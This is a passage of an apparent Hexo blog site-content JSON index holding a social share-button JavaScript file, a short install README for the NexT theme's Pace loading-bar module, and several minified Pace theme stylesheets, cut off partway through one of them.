\"evernote\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.evernote.com/clip.action?\"; url += \"url=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); root.popup(url); }, \"friendfeed\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.friendfeed.com/share?\"; url += \"url=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); root.popup(url); }, \"vkontakte\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"vkontakte.ru/share.php?\"; url += \"url=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); url += \"&description=\" + encodeURIComponent(myoptions.description); url += \"&image=\" + encodeURIComponent(myoptions.image); url += \"&noparse=true\"; root.popup(url); }, \"odnoklassniki\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"www.odnoklassniki.ru/dk?st.cmd=addShare&st.s=1\"; url += \"&st.comments=\" + encodeURIComponent(myoptions.description); url += \"&st._surl=\" + encodeURIComponent(myoptions.url); root.popup(url); }, \"mailru\": function (el) { var myoptions = getOptions(el); var url = myoptions.protocol + \"connect.mail.ru/share?\"; url += \"url=\" + encodeURIComponent(myoptions.url); url += \"&title=\" + encodeURIComponent(myoptions.title); url += \"&description=\" + encodeURIComponent(myoptions.description); url += \"&imageurl=\" + encodeURIComponent(myoptions.image); root.popup(url); } }; // open share link in a popup root.popup = function (url) { // set left and top position var popupWidth = 600, popupHeight = 500, // fix dual screen mode dualScreenLeft = window.screenLeft !== undefined ? window.screenLeft : screen.left, dualScreenTop = window.screenTop !== undefined ? window.screenTop : screen.top, width = window.innerWidth ? window.innerWidth : document.documentElement.clientWidth ? document.documentElement.clientWidth : screen.width, height = window.innerHeight ? window.innerHeight : document.documentElement.clientHeight ? document.documentElement.clientHeight : screen.height, // calculate top and left position left = ((width / 2) - (popupWidth / 2)) + dualScreenLeft, top = ((height / 2) - (popupHeight / 2)) + dualScreenTop, // show popup shareWindow = window.open(url, \"targetWindow\", \"toolbar=no,location=no,status=no,menubar=no,scrollbars=yes,resizable=yes,width=\" + popupWidth + \", height=\" + popupHeight + \", top=\" + top + \", left=\" + left); // Puts focus on the newWindow if (window.focus) { shareWindow.focus(); } }; /* Set options ***********************************************/ // create default options root.options = { iconStyle: \"default\", // default or box boxForm: \"horizontal\", // horizontal or vertical position: \"bottomCenter\", // top / middle / bottom + Left / Center / Right protocol: [\"http\", \"https\"].indexOf(window.location.href.split(\":\")[0]) === -1 ? \"https://\" : \"//\", networks: \"Weibo,Wechat,Douban,QQZone,Twitter,Pinterest,Facebook,GooglePlus,Reddit,Linkedin,Tumblr,Evernote\" }; // integrate custom options for (var i in options) { if (options.hasOwnProperty(i)) { root.options[i] = options[i]; } } // convert networks string into array //root.options.networks = root.options.networks.toLowerCase().split(\",\"); root.options.networks = root.options.networks.split(\",\"); function getOptions(el) { // integrate data attribute options var ret = {}; for (var i in root.options) { if (root.options.hasOwnProperty(i)) { ret[i] = root.options[i]; } } // these attrs must get dynamically. ret.url = window.location.href; ret.title = root.getTitle(); ret.image = root.getImage(); ret.description = root.getDescription(); for (var option in el.dataset) { // replace only 'share-' prefixed data-attributes if (option.match(/share/)) { var newOption = option.replace(/share/, \"\"); if (!newOption.length) { continue; } newOption = newOption.charAt(0).toLowerCase() + newOption.slice(1); var val = el.dataset[option]; if (newOption === \"networks\") { //val = val.toLowerCase().split(\",\"); val = val.split(\",\"); } else if (newOption === \"url\" && val && val[0] === \"/\") { // fix relative url problem. val = location.origin + val; } ret[newOption] = val; } } return ret; } function createDropdown(el) { // create dropdown var dropdownEl = document.createElement(\"span\"); dropdownEl.className = \"need-share-button_dropdown\"; if (el.querySelector(\".need-share-button_dropdown\")) { return; } var myoptions = getOptions(el); // set dropdown row length if (myoptions.iconStyle == \"default\" && myoptions.boxForm == \"vertical\") { dropdownEl.className += \"need-share-button_dropdown-box-vertical\"; } else if (myoptions.iconStyle == \"box\" && myoptions.boxForm == \"horizontal\") { dropdownEl.className += \"need-share-button_dropdown-box-horizontal\"; } else if (myoptions.iconStyle == \"box\" && myoptions.boxForm == \"vertical\") { dropdownEl.className += \"need-share-button_dropdown-box-vertical\"; } // set dropdown position setTimeout(function () { switch (myoptions.position) { case \"topLeft\": dropdownEl.className += \"need-share-button_dropdown-top-left\"; break; case \"topRight\": dropdownEl.className += \"need-share-button_dropdown-top-right\"; break; case \"topCenter\": dropdownEl.className += \"need-share-button_dropdown-top-center\"; dropdownEl.style.marginLeft = -dropdownEl.offsetWidth / 2 + \"px\"; break; case \"middleLeft\": dropdownEl.className += \"need-share-button_dropdown-middle-left\"; dropdownEl.style.marginTop = -dropdownEl.offsetHeight / 2 + \"px\"; break; case \"middleRight\": dropdownEl.className += \"need-share-button_dropdown-middle-right\"; dropdownEl.style.marginTop = -dropdownEl.offsetHeight / 2 + \"px\"; break; case \"bottomLeft\": dropdownEl.className += \"need-share-button_dropdown-bottom-left\"; break; case \"bottomRight\": dropdownEl.className += \"need-share-button_dropdown-bottom-right\"; break; case \"bottomCenter\": dropdownEl.className += \"need-share-button_dropdown-bottom-center\"; dropdownEl.style.marginLeft = -dropdownEl.offsetWidth / 2 + \"px\"; break; default: dropdownEl.className += \"need-share-button_dropdown-bottom-center\"; dropdownEl.style.marginLeft = -dropdownEl.offsetWidth / 2 + \"px\"; break; } }, 1); // fill fropdown with buttons var iconClass = myoptions.iconStyle == \"default\" ? \"need-share-button_link need-share-button_\" : \"need-share-button_link-\" + myoptions.iconStyle + \"need-share-button_link need-share-button_\"; for (var network in myoptions.networks) { if (myoptions.networks.hasOwnProperty(network)) { var link = document.createElement(\"span\"); network = myoptions.networks[network].trim(); var networkLC = network.toLowerCase(); link.className = iconClass + networkLC; var fontello = [\"weibo\", \"wechat\", \"douban\", \"qqzone\", \"renren\"]; if (fontello.indexOf(networkLC) === -1) { link.className += \"social-\" + networkLC; } else { link.className += \"icon-\" + networkLC; } link.dataset.network = networkLC; link.title = network; dropdownEl.appendChild(link); } } dropdownEl.addEventListener(\"click\", function (event) { if (closest(event.target, \".need-share-button_link\")) { event.preventDefault(); event.stopPropagation(); root.share[event.target.dataset.network](el); return false; } }); el.appendChild(dropdownEl); } // close on click outside document.addEventListener(\"click\", function (event) { var openedEl = document.querySelector(\".need-share-button-opened\"); if (!closest(event.target, \".need-share-button-opened\")) { if (openedEl) { openedEl.classList.remove(\"need-share-button-opened\"); // hide wechat code image when close the dropdown. if (openedEl.querySelector(\".need-share-wechat-code-image\")) { openedEl.querySelector(\".need-share-wechat-code-image\").remove(); } } else { var el = closest(event.target, root.elem); if (el) { if (!el.classList.contains(\"need-share-button-opened\")) { createDropdown(el); setTimeout(function () { el.classList.add(\"need-share-button-opened\"); }, 1); } } } } else { setTimeout(function () { openedEl.classList.remove(\"need-share-button-opened\"); // hide wechat code image when close the dropdown. if (openedEl.querySelector(\".need-share-wechat-code-image\")) { openedEl.querySelector(\".need-share-wechat-code-image\").remove(); } }, 1); } }); }; })();"},{"title":"","date":"2021-11-26T18:32:03.287Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/README.html","permalink":"https://hexo.bangz.me/lib/pace/README.html","excerpt":"","text":"Load bar at the top for NexT Installation Step 1 &rarr; Go to NexT dir Change dir to NexT directory. There must be layout, source, languages and other directories: 123$ cd themes/next$ lsbower.json _config.yml docs gulpfile.coffee languages layout LICENSE.md package.json README.md scripts source test Step 2 &rarr; Get module Install module to source/lib directory: 1$ git clone https://github.com/theme-next/theme-next-pace source/lib/pace Step 3 &rarr; Set it up Enable module in NexT _config.yml file: 1pace: true Update 12$ cd themes/next/source/lib/pace$ git pull"},{"title":"","date":"2021-11-26T18:32:03.288Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-barber-shop.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-barber-shop.min.css","excerpt":"","text":".pace,.pace .pace-progress{width:100%;overflow:hidden}.pace,.pace .pace-activity{position:fixed;top:0;left:0}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;z-index:2000;height:12px;background:#fff}.pace-inactive{display:none}.pace .pace-progress{background-color:#29d;position:fixed;top:0;bottom:0;right:100%}.pace .pace-activity{right:-32px;bottom:0;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);-o-transform:translate3d(0,0,0);transform:translate3d(0,0,0);background-image:-webkit-gradient(linear,0 100%,100% 0,color-stop(.25,rgba(255,255,255,.2)),color-stop(.25,transparent),color-stop(.5,transparent),color-stop(.5,rgba(255,255,255,.2)),color-stop(.75,rgba(255,255,255,.2)),color-stop(.75,transparent),to(transparent));background-image:-webkit-linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);background-image:-moz-linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);background-image:-o-linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);background-image:linear-gradient(45deg,rgba(255,255,255,.2) 25%,transparent 25%,transparent 50%,rgba(255,255,255,.2) 50%,rgba(255,255,255,.2) 75%,transparent 75%,transparent);-webkit-background-size:32px 32px;-moz-background-size:32px 32px;-o-background-size:32px 32px;background-size:32px 32px;-webkit-animation:pace-theme-barber-shop-motion .5s linear infinite;-moz-animation:pace-theme-barber-shop-motion .5s linear infinite;-ms-animation:pace-theme-barber-shop-motion .5s linear infinite;-o-animation:pace-theme-barber-shop-motion .5s linear infinite;animation:pace-theme-barber-shop-motion .5s linear infinite}@-webkit-keyframes pace-theme-barber-shop-motion{0%{-webkit-transform:none;transform:none}100%{-webkit-transform:translate(-32px,0);transform:translate(-32px,0)}}@-moz-keyframes pace-theme-barber-shop-motion{0%{-moz-transform:none;transform:none}100%{-moz-transform:translate(-32px,0);transform:translate(-32px,0)}}@-o-keyframes pace-theme-barber-shop-motion{0%{-o-transform:none;transform:none}100%{-o-transform:translate(-32px,0);transform:translate(-32px,0)}}@-ms-keyframes pace-theme-barber-shop-motion{0%{-ms-transform:none;transform:none}100%{-ms-transform:translate(-32px,0);transform:translate(-32px,0)}}@keyframes pace-theme-barber-shop-motion{0%{transform:none}100%{transform:translate(-32px,0)}}"},{"title":"","date":"2021-11-26T18:32:03.291Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-big-counter.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-big-counter.min.css","excerpt":"","text":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace.pace-inactive .pace-progress{display:none}.pace .pace-progress{position:fixed;z-index:2000;top:0;right:0;height:5rem;width:5rem;-webkit-transform:translate3d(0,0,0)!important;-ms-transform:translate3d(0,0,0)!important;transform:translate3d(0,0,0)!important}.pace .pace-progress:after{display:block;position:absolute;top:0;right:.5rem;content:attr(data-progress-text);font-family:\"Helvetica Neue\",sans-serif;font-weight:100;font-size:5rem;line-height:1;text-align:right;color:rgba(34,153,221,.19999999999999996)}"},{"title":"","date":"2021-11-26T18:32:03.292Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-bounce.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-bounce.min.css","excerpt":"","text":".pace{width:140px;height:300px;position:fixed;top:-90px;right:-20px;z-index:2000;-webkit-transform:scale(0);-moz-transform:scale(0);-ms-transform:scale(0);-o-transform:scale(0);transform:scale(0);opacity:0;-webkit-transition:all 2s linear 0s;-moz-transition:all 2s linear 0s;transition:all 2s linear 0s}.pace.pace-active{-webkit-transform:scale(.25);-moz-transform:scale(.25);-ms-transform:scale(.25);-o-transform:scale(.25);transform:scale(.25);opacity:1}.pace .pace-activity{width:140px;height:140px;border-radius:70px;background:#29d;position:absolute;top:0;z-index:1911;-webkit-animation:pace-bounce 1s infinite;-moz-animation:pace-bounce 1s infinite;-o-animation:pace-bounce 1s infinite;-ms-animation:pace-bounce 1s infinite;animation:pace-bounce 1s infinite}.pace .pace-progress{position:absolute;display:block;left:50%;bottom:0;z-index:1910;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;-webkit-transform:scaleY(.3)!important;-moz-transform:scaleY(.3)!important;-ms-transform:scaleY(.3)!important;-o-transform:scaleY(.3)!important;transform:scaleY(.3)!important;-webkit-animation:pace-compress .5s infinite alternate;-moz-animation:pace-compress .5s infinite alternate;-o-animation:pace-compress .5s infinite alternate;-ms-animation:pace-compress .5s infinite alternate;animation:pace-compress .5s infinite alternate}@-webkit-keyframes pace-bounce{0%,100%,95%{top:0;-webkit-animation-timing-function:ease-in}50%{top:140px;height:140px;-webkit-animation-timing-function:ease-out}55%{top:160px;height:120px;border-radius:70px/60px;-webkit-animation-timing-function:ease-in}65%{top:120px;height:140px;border-radius:70px;-webkit-animation-timing-function:ease-out}}@-moz-keyframes pace-bounce{0%,100%,95%{top:0;-moz-animation-timing-function:ease-in}50%{top:140px;height:140px;-moz-animation-timing-function:ease-out}55%{top:160px;height:120px;border-radius:70px/60px;-moz-animation-timing-function:ease-in}65%{top:120px;height:140px;border-radius:70px;-moz-animation-timing-function:ease-out}}@keyframes pace-bounce{0%,100%,95%{top:0;animation-timing-function:ease-in}50%{top:140px;height:140px;animation-timing-function:ease-out}55%{top:160px;height:120px;border-radius:70px/60px;animation-timing-function:ease-in}65%{top:120px;height:140px;border-radius:70px;animation-timing-function:ease-out}}@-webkit-keyframes pace-compress{0%{bottom:0;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;-webkit-animation-timing-function:ease-in}100%{bottom:30px;margin-left:-10px;width:20px;height:5px;background:rgba(20,20,20,.3);box-shadow:0 0 20px 35px rgba(20,20,20,.3);border-radius:20px;-webkit-animation-timing-function:ease-out}}@-moz-keyframes pace-compress{0%{bottom:0;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;-moz-animation-timing-function:ease-in}100%{bottom:30px;margin-left:-10px;width:20px;height:5px;background:rgba(20,20,20,.3);box-shadow:0 0 20px 35px rgba(20,20,20,.3);border-radius:20px;-moz-animation-timing-function:ease-out}}@keyframes pace-compress{0%{bottom:0;margin-left:-30px;width:60px;height:75px;background:rgba(20,20,20,.1);box-shadow:0 0 20px 35px rgba(20,20,20,.1);border-radius:30px/40px;animation-timing-function:ease-in}100%{bottom:30px;margin-left:-10px;width:20px;height:5px;background:rgba(20,20,20,.3);box-shadow:0 0 20px 35px rgba(20,20,20,.3);border-radius:20px;animation-timing-function:ease-out}}"},{"title":"","date":"2021-11-26T18:32:03.294Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-center-atom.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-center-atom.min.css","excerpt":"","text":".pace,.pace .pace-progress{z-index:2000;height:60px;width:100px}.pace .pace-activity,.pace .pace-progress:before{border-radius:50%;display:block;position:absolute}.pace.pace-inactive{display:none}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;position:fixed;margin:auto;top:0;left:0;right:0;bottom:0}.pace .pace-progress{position:absolute;-webkit-transform:translate3d(0,0,0)!important;-ms-transform:translate3d(0,0,0)!important;transform:translate3d(0,0,0)!important}.pace .pace-progress:before{content:attr(data-progress-text);text-align:center;color:#fff;background:#29d;font-family:\"Helvetica Neue\",sans-serif;font-size:14px;font-weight:100;line-height:1;padding:20% 0 7px;width:50%;height:40%;margin:10px 0 0 30px;z-index:999}.pace .pace-activity{font-size:15px;line-height:1;z-index:2000;-webkit-animation:pace-theme-center-atom-spin 2s linear infinite;-moz-animation:pace-theme-center-atom-spin 2s linear infinite;-o-animation:pace-theme-center-atom-spin 2s linear infinite;animation:pace-theme-center-atom-spin 2s linear infinite;border:5px solid #29d;content:'';top:0;left:0;height:60px;width:100px}.pace .pace-activity:after,.pace .pace-activity:before{content:' ';display:block;position:absolute;top:-5px;left:-5px;height:60px;width:100px}.pace .pace-activity:after{border-radius:50%;border:5px solid #29d;-webkit-transform:rotate(60deg);-moz-transform:rotate(60deg);-o-transform:rotate(60deg);transform:rotate(60deg)}.pace .pace-activity:before{border-radius:50%;border:5px solid #29d;-webkit-transform:rotate(120deg);-moz-transform:rotate(120deg);-o-transform:rotate(120deg);transform:rotate(120deg)}@-webkit-keyframes pace-theme-center-atom-spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(359deg)}}@-moz-keyframes pace-theme-center-atom-spin{0%{-moz-transform:rotate(0)}100%{-moz-transform:rotate(359deg)}}@-o-keyframes pace-theme-center-atom-spin{0%{-o-transform:rotate(0)}100%{-o-transform:rotate(359deg)}}@keyframes pace-theme-center-atom-spin{0%{transform:rotate(0)}100%{transform:rotate(359deg)}}"},{"title":"","date":"2021-11-26T18:32:03.296Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-center-circle.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-center-circle.min.css","excerpt":"","text":".pace,.pace .pace-progress{z-index:2000;left:0;top:0;height:6rem}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;-webkit-perspective:12rem;-moz-perspective:12rem;-ms-perspective:12rem;-o-perspective:12rem;perspective:12rem;position:fixed;width:6rem;margin:auto;right:0;bottom:0}.pace.pace-inactive .pace-progress{display:none}.pace .pace-progress{display:block;position:absolute;width:6rem!important;line-height:6rem;font-size:2rem;border-radius:50%;background:rgba(34,153,221,.8);color:#fff;font-family:\"Helvetica Neue\",sans-serif;font-weight:100;text-align:center;-webkit-animation:pace-theme-center-circle-spin linear infinite 2s;-moz-animation:pace-theme-center-circle-spin linear infinite 2s;-ms-animation:pace-theme-center-circle-spin linear infinite 2s;-o-animation:pace-theme-center-circle-spin linear infinite 2s;animation:pace-theme-center-circle-spin linear infinite 2s;-webkit-transform-style:preserve-3d;-moz-transform-style:preserve-3d;-ms-transform-style:preserve-3d;-o-transform-style:preserve-3d;transform-style:preserve-3d}.pace .pace-progress:after{content:attr(data-progress-text);display:block}@-webkit-keyframes pace-theme-center-circle-spin{from{-webkit-transform:rotateY(0)}to{-webkit-transform:rotateY(360deg)}}@-moz-keyframes pace-theme-center-circle-spin{from{-moz-transform:rotateY(0)}to{-moz-transform:rotateY(360deg)}}@-ms-keyframes pace-theme-center-circle-spin{from{-ms-transform:rotateY(0)}to{-ms-transform:rotateY(360deg)}}@-o-keyframes pace-theme-center-circle-spin{from{-o-transform:rotateY(0)}to{-o-transform:rotateY(360deg)}}@keyframes pace-theme-center-circle-spin{from{transform:rotateY(0)}to{transform:rotateY(360deg)}}"},{"title":"","date":"2021-11-26T18:32:03.297Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-center-radar.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-center-radar.min.css","excerpt":"","text":".pace,.pace .pace-activity{z-index:2000;height:90px;width:90px}.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;position:fixed;margin:auto;top:0;left:0;right:0;bottom:0}.pace.pace-inactive .pace-activity{display:none}.pace .pace-activity,.pace .pace-activity:before{position:absolute;display:block;border-color:#29d transparent transparent;border-radius:50%}.pace .pace-activity{left:-30px;top:-30px;border-width:30px;border-style:double;-webkit-animation:spin 1s linear infinite;-moz-animation:spin 1s linear infinite;-o-animation:spin 1s linear infinite;animation:spin 1s linear infinite}.pace .pace-activity:before{content:' ';top:10px;left:10px;height:50px;width:50px;border-width:10px;border-style:solid}@-webkit-keyframes spin{100%{-webkit-transform:rotate(359deg)}}@-moz-keyframes spin{100%{-moz-transform:rotate(359deg)}}@-o-keyframes spin{100%{-moz-transform:rotate(359deg)}}@keyframes spin{100%{transform:rotate(359deg)}}"},{"title":"","date":"2021-11-26T18:32:03.299Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-center-simple.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-center-simple.min.css","excerpt":"","text":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;z-index:2000;position:fixed;margin:auto;top:0;left:0;right:0;bottom:0;height:5px;width:200px;background:#fff;border:1px solid #29d;overflow:hidden}.pace .pace-progress{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;-webkit-transform:translate3d(0,0,0);-moz-transform:translate3d(0,0,0);-ms-transform:translate3d(0,0,0);-o-transform:translate3d(0,0,0);transform:translate3d(0,0,0);max-width:200px;z-index:2000;display:block;position:absolute;top:0;right:100%;height:100%;width:100%;background:#29d}.pace.pace-inactive{display:none}"},{"title":"","date":"2021-11-26T18:32:03.300Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-corner-indicator.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-corner-indicator.min.css","excerpt":"","text":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace .pace-activity{display:block;position:fixed;z-index:2000;top:0;right:0;width:300px;height:300px;background:#29d;-webkit-transition:-webkit-transform .3s;transition:transform .3s;-webkit-transform:translateX(100%) translateY(-100%) rotate(45deg);transform:translateX(100%) translateY(-100%) rotate(45deg);pointer-events:none}.pace.pace-active .pace-activity{-webkit-transform:translateX(50%) translateY(-50%) rotate(45deg);transform:translateX(50%) translateY(-50%) rotate(45deg)}.pace .pace-activity::after,.pace .pace-activity::before{-moz-box-sizing:border-box;box-sizing:border-box;position:absolute;bottom:30px;left:50%;display:block;border:5px solid #fff;border-radius:50%;content:''}.pace .pace-activity::before{margin-left:-40px;width:80px;height:80px;border-right-color:rgba(0,0,0,.2);border-left-color:rgba(0,0,0,.2);-webkit-animation:pace-theme-corner-indicator-spin 3s linear infinite;animation:pace-theme-corner-indicator-spin 3s linear infinite}.pace .pace-activity::after{bottom:50px;margin-left:-20px;width:40px;height:40px;border-top-color:rgba(0,0,0,.2);border-bottom-color:rgba(0,0,0,.2);-webkit-animation:pace-theme-corner-indicator-spin 1s linear infinite;animation:pace-theme-corner-indicator-spin 1s linear infinite}@-webkit-keyframes pace-theme-corner-indicator-spin{0%{-webkit-transform:rotate(0)}100%{-webkit-transform:rotate(359deg)}}@keyframes pace-theme-corner-indicator-spin{0%{transform:rotate(0)}100%{transform:rotate(359deg)}}"},{"title":"","date":"2021-11-26T18:32:03.302Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-fill-left.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-fill-left.min.css","excerpt":"","text":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background-color:rgba(34,153,221,.19999999999999996);position:fixed;z-index:-1;top:0;right:100%;bottom:0;width:100%}"},{"title":"","date":"2021-11-26T18:32:03.303Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-flash.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-flash.min.css","excerpt":"","text":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#29d;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}.pace .pace-progress-inner{display:block;position:absolute;right:0;width:100px;height:100%;box-shadow:0 0 10px #29d,0 0 5px #29d;opacity:1;-webkit-transform:rotate(3deg) translate(0,-4px);-moz-transform:rotate(3deg) translate(0,-4px);-ms-transform:rotate(3deg) translate(0,-4px);-o-transform:rotate(3deg) translate(0,-4px);transform:rotate(3deg) translate(0,-4px)}.pace .pace-activity{display:block;position:fixed;z-index:2000;top:15px;right:15px;width:14px;height:14px;border:2px solid transparent;border-top-color:#29d;border-left-color:#29d;border-radius:10px;-webkit-animation:pace-spinner .4s linear infinite;-moz-animation:pace-spinner .4s linear infinite;-ms-animation:pace-spinner .4s linear infinite;-o-animation:pace-spinner .4s linear infinite;animation:pace-spinner .4s linear infinite}@-webkit-keyframes pace-spinner{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@-moz-keyframes pace-spinner{0%{-moz-transform:rotate(0);transform:rotate(0)}100%{-moz-transform:rotate(360deg);transform:rotate(360deg)}}@-o-keyframes pace-spinner{0%{-o-transform:rotate(0);transform:rotate(0)}100%{-o-transform:rotate(360deg);transform:rotate(360deg)}}@-ms-keyframes pace-spinner{0%{-ms-transform:rotate(0);transform:rotate(0)}100%{-ms-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes pace-spinner{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}"},{"title":"","date":"2021-11-26T18:32:03.306Z","updated":"2018-06-07T10:22:47.000Z","comments":true,"path":"lib/pace/pace-theme-loading-bar.min.css","permalink":"https://hexo.bangz.me/lib/pace/pace-theme-loading-bar.min.css","excerpt":"","text":".pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;-webkit-border-radius:10px;-moz-border-radius:10px;border-radius:10px;-webkit-background-clip:padding-box;-moz-background-clip:padding;background-clip:padding-box;z-index:2000;position:fixed;margin:auto;top:12px;left:0;right:0;bottom:0;width:200px;height:50px;overflow:hidden}.pace .pace-progress{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;-ms-box-sizing:border-box;-o-box-sizing:border-box;box-sizing:border-box;-webkit-border-radius:2px;-moz-border-radius:2px;border-radius:2px;-webkit-background-clip:padding-box;-moz-background-clip:padding;-webkit-transform:translate3d(0,0,0);transform:translate3d(0,0,0);display:block;position:absolute;right:100%;margin-right:-7px;width:93%;top:7px;height:14px;font-size:12px;background:#29d;color:#29d;line-height:60px;font-weight:700;font-family:Helvetica,Arial,\"Lucida Grande\",sans-serif;-webkit-box-shadow:120px 0 #fff,240px 0 #fff;-ms-box-shadow:120px 0 #fff,240px 0 #fff;box-shadow:120px 0 #fff,240px 0 #fff}.pace .pace-progress:after{content:attr(data-progress-text);display:inline-block;position:fixed;width:45px;text-align:right;right:0;padding-right:16px;top:4px}.pace .pace-progress[data-progress-text=\"0%\"]:after{right:-200px}.pace .pace-progress[data-progress-text=\"1%\"]:after{right:-198.14px}.pace .pace-progress[data-progress-text=\"2%\"]:after{right:-196.28px}.pace .pace-progress[data-progress-text=\"3%\"]:after{right:-194.42px}.pace .pace-progress[data-progress-text=\"4%\"]:after{right:-192.56px}.pace .pace-progress[data-progress-text=\"5%\"]:after{right:-190.7px}.pace .pace-progress[data-progress-text=\"6%\"]:after{right:-188.84px}.pace .pace-progress[data-progress-text=\"7%\"]:after{right:-186.98px}.pace .pace-progress[data-progress-text=\"8%\"]:after{right:-185.12px}.pace .pace-progress[data-progress-text=\"9%\"]:after{right:-183.26px}.pace .pace-progress[data-progress-text=\"10%\"]:after{right:-181.4px}.pace .pace-progress[data-progress-text=\"11%\"]:after{right:-179.54px}.pace .pace-progress[data-progress-text=\"12%\"]:after{right:-177.68px}.pace .pace-progress[data-progress-text=\"13%\"]:after{right:-175.82px}.pace .pace-progress[data-progress-text=\"14%\"]:after{right:-173.96px}.pace .pace-progress[data-progress-text=\"15%\"]:after{right:-172.1px}.pace .pace-progress[data-progress-text=\"16%\"]:after{right:-170.24px}.pace .pace-progress[data-progress-text=\"17%\"]:after{right:-168.38px}.pace .pace-progress[data-progress-text=\"18%\"]:after{right:-166.52px}.pace .pace-progress[data-progress-text=\"19%\"]:after{right:-164.66px}.pace .pace-progress[data-progress-text=\"20%\"]:after{right:-162.8px}.pace .pace-progress[data-progress-text=\"21%\"]:after{right:-160.94px}.pace .pace-progress[data-progress-text=\"22%\"]:after{right:-159.08px}.pace .pace-progress[data-progress-text=\"23%\"]:after{right:-157.22px}.pace .pace-progress[data-progress-text=\"24%\"]:after{right:-155.36px}.pace .pace-progress[data-progress-text=\"25%\"]:after{right:-153.5px}.pace .pace-progress[data-progress-text=\"26%\"]:after{right:-151.64px}.pace .pace-progress[data-progress-text=\"27%\"]:after{right:-149.78px}.pace .pace-progress[data-progress-text=\"28%\"]:after{right:-147.92px}.pace .pace-progress[data-progress-text=\"29%\"]:after{right:-146.06px}.pace .pace-progress[data-progress-text=\"30%\"]:after{right:-144.2px}.pace .pace-progress[data-progress-text=\"31%\"]:after{right:-142.34px}.pace .pace-progress[data-progress-text=\"32%\"]:after{right:-140.48px}.pace .pace-progress[data-progress-text=\"33%\"]:after{right:-138.62px}.pace .pace-progress[data-progress-text=\"34%\"]:after{right:-136.76px}.pace .pace-progress[data-progress-text=\"35%\"]:after{right:-134.9px}.pace .pace-progress[data-progress-text=\"36%\"]:after{right:-133.04px}.pace 